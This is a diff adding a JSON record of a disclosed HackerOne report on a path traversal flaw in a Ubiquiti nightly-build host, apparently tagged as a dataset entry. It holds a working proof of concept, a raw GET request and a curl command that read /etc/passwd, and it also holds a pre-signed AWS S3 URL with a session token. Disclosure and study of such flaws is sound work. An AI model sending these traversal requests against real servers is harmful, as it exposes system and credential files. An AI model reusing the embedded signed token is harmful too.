@@ -1,0 +1,40 @@
+{
+    "reported_to": "Ubiquiti Inc.",
+    "reported_by": "bobrov ",
+    "title": "[dev-nightly.ubnt.com] Local File Reading",
+    "content": "\nDescription\nReading files outside the web root via path traversal\nPoC\nCode 93 Bytes\n1GET /..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd HTTP/1.1\n2Host: dev-nightly.ubnt.com\nCode 55 Bytes\n1curl \"https://dev-nightly.ubnt.com/..\\..\\..\\etc\\passwd\"\n<image_0>\n\n",
+    "severity": [
+        7.0,
+        8.9
+    ],
+    "bounty": null,
+    "weaknesses": [
+        "Path Traversal"
+    ],
+    "screenshots": {
+        "image_0": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/213/057/0ae2d3052f8bf6c5d8ce100aa6ba6a9d43c4bfec/Screenshot_at_20-47-03.png?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_at_20-47-03.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_at_20-47-03.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTYZ3LV4J%2F20250326%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250326T194252Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEMr%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIGpXChDQFzHS618muDfIgrMWVDDHPvBqpPf%2Fc%2FOu4O%2B5AiEA0Lc5OOIvN5JEeVMbvCo8i9zBG4aMZl7ku3Glf1x1TWUqsgUIMxADGgwwMTM2MTkyNzQ4NDkiDBKgVgHqHwECRyOygSqPBbXWTDCabAYWMidOhwYhqZDpA8CPPt2rj2m2jBvhq5OooOPGstdbAQD1ybInW3a7ZcFtXPgu6hpoZkOPILAmDaq8xNdQkaf5Ipi31hre%2BVx%2FyZ3NyLUwN3EMb9iWu%2Fh1NAKu3Ise%2BBRa%2FnrSrq8jmCsgrZe5OY%2Fl4cD53z2BohapYs1SdJmfnjBYHeIUExEGDMsAlEDMjX9b1tv%2Bm1EzKRIv2EjFz9hras5XhDSCByzfK2p18h74EaSu4N%2FL%2FDi%2FKTKKISyp8vl6sXvN3BK107RwEQWIGo4F6ybyjbzmVu5eCEt33Pwo1cO%2FtWyh2ErF%2FoG2iCy0P6O5VQRs5GAJzMHTAkQAPkVI9yJ1dMHcFIMU3WAgCEVq%2BjSb02xMt0wDvxzc1DxROQF6XsnPJxG7pA5FvR4CJIw%2FIqeSUX7qkhXGOCRh91%2Bi7AGzldS3PgzhXD2tyADO64coo1npUzkWHSbGN2s7FHaKBg9buC0Gdcw%2FYqHWXb%2FezH%2BumFAT7wOn0L9HZWpWuFnVewTVxqD%2FwajnWsHA4Nf3ViL4EPEz2z8oF%2Fq9JVO1NWsDnNMaFbhcHuvFA%2FFBg5K%2BFktudUCO349RjYpFiX04SGK2ByrHeYYnuCdViGHCO4eZvWwxZ7ZXp1H674TF5F0IGdHRH65knr2wUjynfT8QbyMRjrNYysWVa4fTzUtNvxxQIc4%2BgH5SapxPuJFnV9O8ZqMcTL5kH5mTI5pWUdjO%2Fcq3hRgtZd3Y1prFQvHQsLDWMeREvGBi8G05%2FXVyQ1%2Fk1y4uk%2F%2FjwHvep9zO5XhO96sv8onQdWWSVaWmGVwW8EH8UlJ9dNmmaP5bou19UxxmmQRzlEaX1kMiS6HH5Wn0Boj2f9rW5uYw7fiQvwY6sQE0IJ2uUF2Lc7t23ItG27YWAX0j%2FTWycvzlo4P02T%2FudRKMFmsP0EvlBIROh%2Bwy53Q%2FCS3XbEWlb1deanSq0wPxiK50Ik5pM024835IE8%2Fx%2B%2B%2BOdjKEvwZ4tgFMAyOogzI8c1egFJjGfvMAsyAArhvnRwOr8XiNIfUDiebY9tZmr7OorRAOxj4vMUoAvWxe%2FIAt0JYhCpx%2FFoWWTLgVisZErrEK53K%2FNI4KKkfMFrAUny8%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=38d6864676b648626cceaa7be373fc188b643c8263f14db4cabc6a91f5223e68"
+    },
+    "disclosed_date": 1505427780,
+    "report_url": "https://hackerone.com/reports/260420",
+    "is_multi_component": true,
+    "complexity": "HIGH",
+    "novelty": "MEDIUM",
+    "vuln_category": "WEB_APP",
+    "steps": [
+        [
+            1,
+            "Send a GET request with path traversal to read /etc/passwd: `GET /..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd HTTP/1.1`"
+        ],
+        [
+            2,
+            "Alternatively, use curl to perform the same attack: `curl \"https://dev-nightly.ubnt.com/..\\..\\..\\etc\\passwd\"`"
+        ]
+    ],
+    "vuln_description": "This vulnerability allows an attacker to read files outside the web root directory via path traversal. By manipulating the URL path with `..\\` sequences, the attacker can access sensitive system files such as `/etc/passwd`.",
+    "reason": "The attack is straightforward and involves a well-known technique (path traversal) with no complex interactions or state manipulations required. The vulnerability is easily reproducible with standard tools like curl or a simple HTTP request.",
+    "new_complexity": "LOW",
+    "requires_code": false,
+    "requires_CVE": false,
+    "is_ctf": false,
+    "other_report": null
+}
